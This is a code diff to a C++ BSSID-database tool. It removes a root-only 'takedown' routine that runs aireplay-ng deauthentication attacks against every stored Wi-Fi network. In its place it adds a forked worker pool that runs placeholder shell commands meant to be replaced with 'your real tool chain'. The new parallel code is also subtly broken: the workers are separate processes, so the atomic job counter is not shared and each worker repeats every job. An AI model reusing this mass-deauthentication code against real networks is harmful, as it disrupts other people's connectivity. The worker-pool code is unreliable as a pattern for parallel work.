@@ -6,6 +6,9 @@
 #include <sys/wait.h>
 #include "nlohmann/json.hpp"
 #include "../include/db.h"
+#include <atomic>
+#include <vector>
+#include <thread>
 using json = nlohmann::json;
 
 int main(int argc, char* argv[]){
@@ -40,56 +43,92 @@ int main(int argc, char* argv[]){
         json j = load_bssid_database();
         remove_entry(bssid);
         std::cout << "Removed entry: " << bssid << std::endl;
-    } else if (operation == "takedown"){
-        if (geteuid() != 0) {
-            std::cerr << "This program must be run as root!\n";
-            return 1;
-        }
-        if (argc < 5){
-            std::cerr <<"takedown operation requires 3 arguments: packet number, interface and database file." << std::endl;
-            return 1;
-        }
-        std::string packet_number = argv[2];
-        std::string interface = argv[3];
-        std::string path = argv[4];
-        set_path(path);
-        json j = load_bssid_database();
-        if (j.empty()){
-            std::cerr << "Database is empty, nothing to takedown." << std::endl;
-            return 1;
-        }
-        std::cout << j.size() << "\n";
-        std::vector<pid_t> children;
-        for (size_t i = 0; i < j.size(); i++) {
-            std::string bssid = j[i]["bssid"].get<std::string>();
-            int channel = j[i]["channel"].get<int>();
+    } else if (operation == "takedown") {
 
-            // set channel
+    if (geteuid() != 0) {
+        std::cerr << "This program must be run as root!\n";
+        return 1;
+    }
+
+    if (argc < 5) {
+        std::cerr << "takedown requires: packet_number interface db\n";
+        return 1;
+    }
+
+    std::string packet_number = argv[2];
+    std::string interface = argv[3];
+    std::string path = argv[4];
+
+    set_path(path);
+
+    json j = load_bssid_database();
+
+    if (!j.is_array() || j.empty()) {
+        std::cerr << "Database empty or invalid\n";
+        return 1;
+    }
+
+    // ----------------------------
+    // Build job list
+    // ----------------------------
+    std::vector<json> jobs = j;
+
+    const int WORKERS = 4; // adjust: 2–8 is typical
+
+    std::atomic<size_t> index = 0;
+
+    auto worker = [&](int id) {
+        while (true) {
+            size_t i = index.fetch_add(1);
+            if (i >= jobs.size()) break;
+
+            auto network = jobs[i];
+
+            std::string bssid = network["bssid"].get<std::string>();
+            int channel = network["channel"].get<int>();
+
+            std::cout << "[worker " << id << "] processing "
+                      << bssid << " ch " << channel << std::endl;
+
             pid_t pid = fork();
-            if (pid == 0) {
-                execlp("iwconfig", "iwconfig",
-                    interface.c_str(), "channel",
-                    std::to_string(channel).c_str(), nullptr);
-                _exit(1);
-            }
-            waitpid(pid, nullptr, 0);
 
-            // start attack
-            pid = fork();
             if (pid == 0) {
-                execlp("aireplay-ng", "aireplay-ng",
-                    "--deauth", packet_number.c_str(),
-                    "-a", bssid.c_str(),
-                    interface.c_str(), nullptr);
+                // Example: replace this with your real tool chain
+                std::string cmd =
+                    "echo setup " + bssid +
+                    " && sleep 2 && echo running " + bssid;
+
+                execlp("sh", "sh", "-c", cmd.c_str(), nullptr);
                 _exit(1);
             }
 
-            sleep(3);
-
-            // stop attack
-            //kill(pid, SIGTERM);
             waitpid(pid, nullptr, 0);
         }
-    }    
+    };
 
-}
+    // ----------------------------
+    // Spawn workers
+    // ----------------------------
+    std::vector<pid_t> workers;
+
+    for (int i = 0; i < WORKERS; i++) {
+        pid_t pid = fork();
+
+        if (pid == 0) {
+            worker(i);
+            _exit(0);
+        }
+
+        workers.push_back(pid);
+    }
+
+    // ----------------------------
+    // Wait for all workers
+    // ----------------------------
+    for (pid_t pid : workers) {
+        waitpid(pid, nullptr, 0);
+    }
+
+    std::cout << "All tasks completed.\n";
+} 
+
